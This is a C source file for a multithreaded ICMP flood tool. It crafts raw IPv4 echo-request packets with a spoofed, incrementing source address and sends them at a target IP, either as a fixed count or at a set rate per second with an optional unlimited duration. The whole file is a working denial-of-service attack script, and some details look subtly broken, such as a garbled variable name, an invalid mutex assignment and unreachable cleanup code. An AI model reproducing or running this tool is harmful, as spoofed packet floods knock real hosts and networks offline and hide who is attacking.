#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <wait.h>
#include <pthread.h>
#include "icmp_flood.h"

#include "make_ipv4.h"

int icmp_total;
int icmp_produced;
int icmp_received;

int icmp_per_seicmp_cond;
int icmp_duration;
double icmp_elapsed_time;
char *icmp_dest_ip;
char *icmp_src_ip;

pthread_mutex_t icmp_mutex;
pthread_cond_t icmp_cond;

void icmp_flood_print_usage(int mode) {
	if (mode == 1)
		printf("ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
	if (mode == 2)
		printf(
				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seicmp_conds] [icmp_duration (0 for INF)]\n");
}

void* generate_icmp_request1(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));

		//modify icmp_src_ip, increment 1.
		next_ip_addr(icmp_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_produced);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));

		pthread_mutex_lock(&icmp_mutex);

		if (icmp_produced >= icmp_total) {
			pthread_mutex_unlock(&icmp_mutex);
			pthread_cond_broadcast(&icmp_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
		free(packet);
		icmp_produced++;

		pthread_mutex_unlock(&icmp_mutex);
	}
	close(sock);
	return 0;
}

void* generate_icmp_request2(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));

		//modify icmp_src_ip, increment 1.
		next_ip_addr(icmp_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_total);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));

		pthread_mutex_lock(&icmp_mutex);

		if (icmp_elapsed_time >= icmp_duration) {
			pthread_mutex_unlock(&icmp_mutex);
			pthread_cond_broadcast(&icmp_cond);
			return 0;
		}

		if(icmp_produced == icmp_per_seicmp_cond)
		{
			pthread_cond_wait(&icmp_cond, &icmp_mutex);
		}
		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
		free(packet);
		icmp_produced++;
		icmp_total++;

		pthread_mutex_unlock(&icmp_mutex);
	}
	close(sock);
	return 0;
}

void *icmp_time_check(void *data)
{
	int thread_id = *((int*) data);
	clock_t t1,t2;
	t1=clock();
	clock_t elapsed_time = clock();
	double time_taken;

	while(1)
	{
		pthread_mutex_lock(&icmp_mutex);
		t2=clock();
		time_taken = ((double)(t2-t1))/CLOCKS_PER_SEC;

		if(time_taken>=1.0)
		{
			icmp_produced=0;
			t1=clock();
			icmp_elapsed_time = ((double)(t1-elapsed_time))/CLOCKS_PER_SEC;
			time_taken=0;

			pthread_cond_signal(&icmp_cond);
		}
		pthread_mutex_unlock(&icmp_mutex);
	}
}

void icmp_flood_run(char *argv[], int mode) {

	icmp_src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 4) {
		icmp_flood_print_usage(mode);
		return;
	}
	else if(mode==2 && argc != 5)
	{
		icmp_flood_print_usage(mode);
		return;
	}

	strcpy(icmp_src_ip, argv[0]);

	icmp_mutex = PTHREAD_MUTEX_INITIALIZER;

	icmp_produced = 0;
	if (mode == 1) {
		icmp_total = atoi(argv[3]);
		icmp_received = 0;
	}

	if(mode == 2)
	{
		icmp_total=0;
		icmp_per_seicmp_cond = atoi(argv[3]);
		icmp_duration = atoi(argv[4]);
		if(icmp_duration==0) icmp_duration=(1<<30);
	}

	int num_threads = atoi(argv[2]);

	icmp_dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;


	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads+1));
	generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * (num_threads+1));
	int i;


	printf("Sending ICMP requests to %s using %d threads\n",icmp_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;


	for (i = 0; i < num_threads; i++) {
	if(mode==1)
		pthread_create(&generate_thread[i], NULL, generate_icmp_request1,
				(void*) &generate_thread_id[i]);
	if(mode==2)
		pthread_create(&generate_thread[i], NULL, generate_icmp_request2,
						(void*) &generate_thread_id[i]);
	}

	if(mode==2)
	{
		pthread_create(&generate_thread[i], NULL, icmp_time_check,
								(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}


	pthread_mutex_destroy(&icmp_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(icmp_src_ip);
}

